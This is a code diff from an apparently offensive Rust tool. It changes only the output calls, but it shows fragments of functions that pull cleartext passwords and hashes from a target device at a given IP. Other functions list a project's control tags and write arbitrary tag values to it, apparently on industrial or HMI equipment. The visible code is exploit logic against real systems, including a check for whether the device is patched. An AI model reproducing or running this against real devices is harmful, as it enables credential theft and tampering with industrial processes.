@@ -71,7 +71,7 @@ pub fn retrieve_passwords(target_ip: &str, port: u16) -> Result<Vec<PasswordEntr
                 if after.len() > pass_len {
                     let password =
                         String::from_utf8_lossy(&after[1..=pass_len]).to_string();
-                    println!("Password for user level {user_level}: {password}");
+                    crate::casket_outln!("Password for user level {user_level}: {password}");
                     results.push(PasswordEntry {
                         user_level,
                         password: Some(password),
@@ -83,7 +83,7 @@ pub fn retrieve_passwords(target_ip: &str, port: u16) -> Result<Vec<PasswordEntr
             let after = &chunk[pos + hash_marker.len()..];
             if after.len() >= 64 {
                 let hash_val = String::from_utf8_lossy(&after[..64]).to_string();
-                println!("Hash for user level {user_level}: {hash_val}");
+                crate::casket_outln!("Hash for user level {user_level}: {hash_val}");
                 results.push(PasswordEntry {
                     user_level,
                     password: None,
@@ -94,7 +94,7 @@ pub fn retrieve_passwords(target_ip: &str, port: u16) -> Result<Vec<PasswordEntr
     }
 
     if results.is_empty() {
-        println!("No passwords or hashes found (patched?).");
+        crate::casket_outln!("No passwords or hashes found (patched?).");
     }
     Ok(results)
 }
@@ -126,7 +126,7 @@ pub fn get_tags(target_ip: &str, port: u16) -> Result<(String, Vec<String>)> {
         _ => anyhow::bail!("No ProjectName found"),
     };
 
-    println!("Found project: {project}");
+    crate::casket_outln!("Found project: {project}");
 
     let tcr_body = match agent
         .get(&format!("http://{target_ip}:{effective_port}/{project}.tcr"))
@@ -143,7 +143,7 @@ pub fn get_tags(target_ip: &str, port: u16) -> Result<(String, Vec<String>)> {
         if line.starts_with("#!-- N =") {
             found_header = true;
             let count = line.split('=').nth(1).map_or("?", str::trim);
-            println!("Found {count} tags:");
+            crate::casket_outln!("Found {count} tags:");
         }
         if found_header && !line.contains('#') && line.contains(';') {
             let tag = line.split(';').next().unwrap_or("").trim().to_string();
@@ -212,11 +212,11 @@ pub fn write_tag_value(target_ip: &str, port: u16, tag_name: &str, value: &str) 
 
     match agent.get(&url).call() {
         Ok(_) => {
-            println!("Wrote {tag_name} = {value}");
+            crate::casket_outln!("Wrote {tag_name} = {value}");
             Ok(true)
         }
         Err(e) => {
-            println!("Failed to write tag: {e}");
+            crate::casket_outln!("Failed to write tag: {e}");
             Ok(false)
         }
     }
